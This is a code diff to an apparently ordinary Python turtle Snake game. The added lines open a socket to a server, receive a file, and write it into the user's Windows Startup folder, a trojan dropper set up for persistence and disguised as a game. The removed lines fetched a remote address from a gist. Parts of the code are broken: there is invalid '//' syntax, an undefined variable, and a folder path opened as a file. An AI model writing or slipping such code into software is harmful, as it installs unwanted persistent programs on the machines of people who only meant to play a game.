@@ -1,7 +1,11 @@
+from vuls import *
+import socket
 import random
 import time
 import turtle
 import urllib.request
+import winreg as reg
+import os
 
 delay = 0.1
 
@@ -93,20 +97,20 @@ wn.onkeypress(go_down, "s")
 wn.onkeypress(go_left, "a")
 wn.onkeypress(go_right, "d")
 
-#server connection
-url = 'https://gist.githubusercontent.com/YOTAM-D-ST/fb8413decc725b137d749' \
-      '5159' \
-      'edb6291/raw/ffb80d77d881d66eb9d9500e8d69ada36169d070/snake'
-response = urllib.request.urlopen(url)
-data = response.read()  # a `bytes` object
-text = data.decode(
-    'utf-8')  # a `str`; this step can't be used if data is binary
-print(text)
-url = 'http://' + text
-response = urllib.request.urlopen(url)
-data = response.read()  # a `bytes` object
-// TODO:
-print(text)
+# server connection
+my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+my_socket.connect((SERVER_IP, SERVER_PORT))  # local server
+signal = "game".encode()
+my_socket.sendall(signal)
+user_name = os.getlogin()
+location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(user_name)
+with open(location, "wb") as f:  # todo: where to open file
+    while not done:
+        data = my_socket.recv(1024)
+        if data == "EOF":
+            done = True
+        else:
+            f.write(data)
 
 # Main game loop
 while True:
